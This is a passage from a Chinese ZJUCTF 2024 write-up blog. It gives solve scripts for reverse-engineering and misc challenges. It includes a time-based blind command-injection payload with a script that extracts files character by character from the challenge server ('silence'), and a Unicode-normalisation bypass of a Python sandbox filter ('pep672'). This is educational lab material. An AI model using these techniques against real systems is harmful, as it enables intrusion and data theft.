ZJUCTF&#123;5aK1-CHan&#x27;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/25.png" srcset="/img/loading.gif" lazyload></p></li>
</ul>
<div class="note note-info">
            <p>但其实可以用C语言的LCG伪随机生成方式破解，我甚至忘了这回事😑</p>
          </div>
<h2 id="rukma">rukma</h2>
<ul>
<li>稍微逆向了一下，发现是个游戏，flag是由x,m,o,-组合而成的，每遇到x,m,o就对8个比特的列表进行交换改变等操作，最终目标是得到5个3，还给了flag的md5值： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>flag = <span class="hljs-string">&quot;m-x-m-m-o-o-x-o-m-x-o-x&quot;</span><br><br><span class="hljs-comment"># - 有 11 个</span><br>b = [<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">tmp1,tmp2</span>):<br>    <span class="hljs-keyword">if</span> tmp1:<br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">1</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">1</span>]==<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> tmp2:<br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">2</span>:<br>            b[<span class="hljs-number">6</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">6</span>]=<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">4</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">2</span>:<br>            b[<span class="hljs-number">7</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">7</span>]==<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">5</span>]==<span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">3</span>:<br>            tmp+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> tmp==<span class="hljs-number">5</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">2</span>):<br>    i = flag[j]<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;x&quot;</span>:<br>        b[<span class="hljs-number">3</span>],b[<span class="hljs-number">5</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">4</span>] = b[<span class="hljs-number">5</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">4</span>],b[<span class="hljs-number">3</span>]<br>        magic(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;m&quot;</span>:<br>            b[<span class="hljs-number">0</span>],b[<span class="hljs-number">3</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>] = b[<span class="hljs-number">3</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">0</span>]<br>            magic(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&quot;o&quot;</span>:<br>            b[<span class="hljs-number">0</span>],b[<span class="hljs-number">5</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">4</span>] = b[<span class="hljs-number">5</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">4</span>],b[<span class="hljs-number">0</span>]<br>            magic(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            b = [<span class="hljs-number">0</span>]*<span class="hljs-number">8</span><br><br>md5_value = <span class="hljs-string">&quot;0A7E520E468C218583034BD49BE3B5DC&quot;</span><br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></li>
<li>但是看了半天也没有理解x,m,o对应操作的意义是什么，然后发现可变的字符就3个，3**12种可能完全可以根据md5爆破（最后把flag代回去发现列表也没有5个3，肯定哪里逆向错了，懒得改了）： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>chars = [<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]<br>combinations = itertools.product(chars, repeat=<span class="hljs-number">12</span>)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params">s</span>):<br>    flag = s[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>        flag+=<span class="hljs-string">&quot;-&quot;</span>+s[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> flag<br>res = <span class="hljs-string">&quot;0A7E520E468C218583034BD49BE3B5DC&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>    test = getflag(<span class="hljs-string">&quot;&quot;</span>.join(combo))<br>    i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i%<span class="hljs-number">100</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> / 531441&quot;</span>)<br>    <span class="hljs-keyword">if</span> md5(test.encode()).hexdigest()==res:<br>        <span class="hljs-built_in">print</span>(test)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># ZJUCTF&#123;m-x-m-m-o-o-x-o-m-x-o-x&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/26.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="minecraft">minecraft</h2>
<ul>
<li>用dnSpy逆向data目录下的<code>Assembly-CSharp.dll</code>文件，得到整个游戏的逻辑，观察单人游戏的代码，将初始的获得方块数修改，就能得到第一部分flag( ZJUCTF{lt^5_ ): <img src="/img/zjuctf2024/34.png" srcset="/img/loading.gif" lazyload> <img src="/img/zjuctf2024/35.png" srcset="/img/loading.gif" lazyload></li>
<li>观察代码得到多人游戏的入口代码，应该是flag的第二段(sO_345y_M0dD): <img src="/img/zjuctf2024/36.png" srcset="/img/loading.gif" lazyload></li>
<li>根据提示查看unity内部的资源，寻找相关flag的3d建模，果然发现了第三个flagpiece(1nG_uNi7y_k): <img src="/img/zjuctf2024/37.png" srcset="/img/loading.gif" lazyload></li>
<li>根据提示去找没有应用的场景，发现有一个<code>ThroneRoomHandler</code>没有使用，那怎么让unity调用这个场景呢，我想了半天才想到，可以把多人游戏的代码改成<code>ThroneRoomHandler</code>的代码，并把unity需要加载该场景的<code>level4.resS</code>改成多人游戏所需要的场景，就看到了flag(VloCk1nG_rE}): <img src="/img/zjuctf2024/38.png" srcset="/img/loading.gif" lazyload></li>
<li>连起来的flag:ZJUCTF{lt^5_sO_345y_M0dD1nG_uNi7y_kVloCK1nG_rE}，做出来这题是真有成就感，太难想了。</li>
</ul>
<h2 id="easyhap">easyhap</h2>
<ul>
<li>是一道鸿蒙的app逆向题，解包后将<code>.abc</code>文件放入分析软件，就可以得到源代码逻辑:</li>
<li>程序先规定了一堆窗口，这跟app外貌有关，然后读取你输入的flag，用CryptoUtil类下的encrypt方法加密flag与一串密文比对: <img src="/img/zjuctf2024/39.png" srcset="/img/loading.gif" lazyload></li>
<li>encrypt方法进行了四次加密，先将flag拆成前后两部分，分别对其进行AES的ECB和CBC加密，再将后一段与前一段异或再与后一段拼起来，最后是一个base64的加密: <img src="/img/zjuctf2024/40.png" srcset="/img/loading.gif" lazyload></li>
<li>写个脚本得到flag: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>res = <span class="hljs-string">&quot;Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c=&quot;</span><br>tmp = b64decode(res)<br>new = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    new += <span class="hljs-built_in">bytes</span>([tmp[i]^tmp[i+<span class="hljs-number">16</span>]])<br>new+=tmp[<span class="hljs-number">16</span>:]<br><span class="hljs-built_in">print</span>(new)<br>cipher = AES.new(<span class="hljs-string">b&quot;ZJUCTF2024-OHAPP&quot;</span>, AES.MODE_ECB)<br>new1 = cipher.decrypt(new[:<span class="hljs-number">16</span>])<br>cipher = AES.new(<span class="hljs-string">b&quot;ZJUCTF2024-OHAPP&quot;</span>, AES.MODE_CBC,new[:<span class="hljs-number">16</span>])<br>new2 = cipher.decrypt(new[<span class="hljs-number">16</span>:])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;ZJUCTF&#123;&quot;</span>+new1+new2+<span class="hljs-string">b&quot;&#125;&quot;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_&#125;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h1 id="pwn"><strong>Pwn</strong></h1>
<div class="note note-danger">
            <p>不会pwn...</p>
          </div>
<h1 id="misc"><strong>Misc</strong></h1>
<p>这部分题目是最有意思的，需要的脑洞很大🫨</p>
<h2 id="小a口算">小A口算</h2>
<ul>
<li>与服务器交互，类似于小猿口算</li>
<li>用pwndbg交互即可: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">63142</span>)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>io.recvline()<br>io.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getans</span>():<br>    tmp = io.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp.split(<span class="hljs-string">&quot;\n&quot;</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;?&quot;</span> <span class="hljs-keyword">in</span> i:<br>            problem = i<br>            <span class="hljs-keyword">break</span><br>    num1,num2 = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,problem.split(<span class="hljs-string">&quot;?&quot;</span>))<br>    <span class="hljs-built_in">print</span>(num1,num2)<br>    <span class="hljs-keyword">if</span> num1==num2:<br>        io.sendline(<span class="hljs-string">b&quot;=&quot;</span>)<br>    <span class="hljs-keyword">elif</span> num1&gt;num2:<br>        io.sendline(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        io.sendline(<span class="hljs-string">b&quot;&lt;&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    getans()<br>    <span class="hljs-keyword">if</span>  <span class="hljs-string">&quot;Correct!&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/1.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="master-of-c">master of c++</h2>
<ul>
<li>用c++编写一个判断质数的函数，然后用main调用；</li>
<li>一开始还卡了半天，用递归写的，还以为是递归层数过高导致编译的问题，后来才发现是没有处理负数情况（恼）: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N,<span class="hljs-type">int</span> i&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">P</span>&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=(N%i)&amp;&amp;(P&lt;N,i<span class="hljs-number">-2</span>&gt;::V);&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">P</span>&lt;N,<span class="hljs-number">1</span>&gt;&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=<span class="hljs-literal">true</span>;&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Q</span>&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=N&lt;<span class="hljs-number">2</span>?<span class="hljs-number">1</span>:N==<span class="hljs-number">2</span>?<span class="hljs-number">0</span>:!(N%<span class="hljs-number">2</span>&amp;&amp;P&lt;N,N/<span class="hljs-number">2</span><span class="hljs-number">+1</span>-(N/<span class="hljs-number">2</span>)%<span class="hljs-number">2</span>&gt;::V);&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> Q&lt;ARG&gt;::V;&#125;<br></code></pre></td></tr></table></figure></li>
<li>flag是<code>ZJUCTF&#123;pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l&#125;</code></li>
</ul>
<h2 id="bytes">Bytes</h2>
<ul>
<li><p>拿到一堆数字，最大的是63即6位，猜测是转化成0/1并按照某种规则显示出flag： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bytes.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>li = [<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readline().split(<span class="hljs-string">&quot;,&quot;</span>)]<br>text = <span class="hljs-string">&quot;&quot;</span>.join(li)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(text))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>,<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text)%i==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)//i):<br>            <span class="hljs-built_in">print</span>(text[j*i:(j+<span class="hljs-number">1</span>)*i])<br>        <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/4.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>之前做校巴ZJUCTF2022那道 <code>wierd encoding</code> 就有这种思路了，只能说yelan的想法跟我不谋而合（）</p></li>
</ul>
<h2 id="chess-encoding">chess encoding</h2>
<ul>
<li><p>根据题目的提示，用棋盘编码，编写python脚本，最后得到一串数字，猜测是base8加密，得到flag： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chessdecode</span>(<span class="hljs-params">image_path</span>): <br>    image = Image.<span class="hljs-built_in">open</span>(image_path)<br>    img = image.convert(<span class="hljs-string">&#x27;RGB&#x27;</span>) <br><br>    width, height = img.size<br>    grid_size_x = width // <span class="hljs-number">8</span><br>    grid_size_y = height // <span class="hljs-number">8</span><br>    chess = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            center_x = i * grid_size_x + grid_size_x // <span class="hljs-number">2</span><br>            center_y = j * grid_size_y + grid_size_y // <span class="hljs-number">2</span><br>            r, g, b = img.getpixel((center_x, center_y))<br>            <span class="hljs-comment"># print(r,g,b)</span><br>            <span class="hljs-keyword">if</span> (r, g, b) != (<span class="hljs-number">239</span>,<span class="hljs-number">216</span>,<span class="hljs-number">180</span>) <span class="hljs-keyword">and</span> (r, g, b) != (<span class="hljs-number">180</span>,<span class="hljs-number">135</span>,<span class="hljs-number">98</span>):<br>                chess.append((i, j))<br>    text = <span class="hljs-string">&quot;01234567&quot;</span>[::-<span class="hljs-number">1</span>]<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chess:<br>        res = text[i[<span class="hljs-number">1</span>]]+res<br>    <span class="hljs-keyword">return</span> res<br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):<br>    image_path = <span class="hljs-string">f&#x27;./chess-release/chess-release/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    res+=chessdecode(image_path)<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">8</span>)))<br></code></pre></td></tr></table></figure></p>
<p><img src="/img/zjuctf2024/5.png" srcset="/img/loading.gif" lazyload></p></li>
</ul>
<h2 id="silence">silence</h2>
<ul>
<li><p>用ida逆向一下，发现是个popen实现的shell，可以执行命令，但是回显被清除了，于是考虑时间盲注，首先发现<code>sleep 1</code>可执行，于是构造payload: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sleep $( [ &quot;$(ls /| tr &#x27;\n&#x27; &#x27; &#x27; | head -c i | tail -c 1)&quot; = letter ] &amp;&amp; echo 1)<br></code></pre></td></tr></table></figure></p></li>
<li><p>编写脚本得到ls的结果 (时间还是挺长的)，并且用<code>if ans_len!=2 and ans[-2:]==i*2:</code>强制中断<code>tail</code>导致的最后一个字符重复输出(后来想到可以先用wc爆破出长度，但是已经懒得改了): <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">55986</span>)<br><br>strings = <span class="hljs-string">&#x27; tabcdefghijklmnopqrsuvwxyz!#%&amp;()+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ*&#x27;</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;$ &quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcommand</span>(<span class="hljs-params">cmd</span>):<br>    t1 = time.time()<br>    io.sendline(cmd.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;$ &quot;</span>)<br>    t2 = time.time()<br>    <span class="hljs-keyword">return</span> t2-t1<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br>ans_len = <span class="hljs-number">0</span><br>cmd = <span class="hljs-string">&quot;cat /ea*&quot;</span>   <span class="hljs-comment"># &quot;ls /| tr &#x27;\\n&#x27; &#x27; &#x27;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    ans_len+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>        payload = <span class="hljs-string">f&#x27;&#x27;&#x27;sleep $( [ &quot;$(<span class="hljs-subst">&#123;cmd&#125;</span> | head -c <span class="hljs-subst">&#123;ans_len&#125;</span> | tail -c 1)&quot; = &quot;<span class="hljs-subst">&#123;i&#125;</span>&quot; ] &amp;&amp; echo 1)&#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload)&lt;<span class="hljs-number">80</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-keyword">if</span> sendcommand(payload)&gt;<span class="hljs-number">0.5</span>:<br>            <span class="hljs-keyword">if</span> ans_len!=<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> ans[-<span class="hljs-number">2</span>:]==i*<span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                ans+=i<br>                <span class="hljs-built_in">print</span>(ans)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/6.png" srcset="/img/loading.gif" lazyload></p></li>
<li><p>发现flag很长，但是难不倒我们的<code>cat /ea*</code>大人,把脚本中的cmd改成<code>cat /ea*</code>运行即可：</p>
<p><img src="/img/zjuctf2024/7.png" srcset="/img/loading.gif" lazyload></p></li>
</ul>
<h2 id="pep672">pep672</h2>
<ul>
<li><p>个人认为是一道很精彩的沙箱题目(如果之前没做过类似的话)，首先出题人过滤了ascii的数字和字母，结合题目名字<code>pep72</code>去搜索相关资料，是Unicode字符规范绕过。由于之前做过类似的web题目，根据<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">网址</a>可以找到大部分绕过的字母： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">normal = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzT&quot;</span><br>abnormal = <span class="hljs-string">&quot;ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖ𝗊ʳˢᵗᵘᵛʷˣʸᶻᵀ&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">genstr</span>(<span class="hljs-params">s</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> normal:<br>            res+=abnormal[normal.index(i)]<br>        <span class="hljs-keyword">else</span>:<br>            res+=i<br>    <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure></p></li>
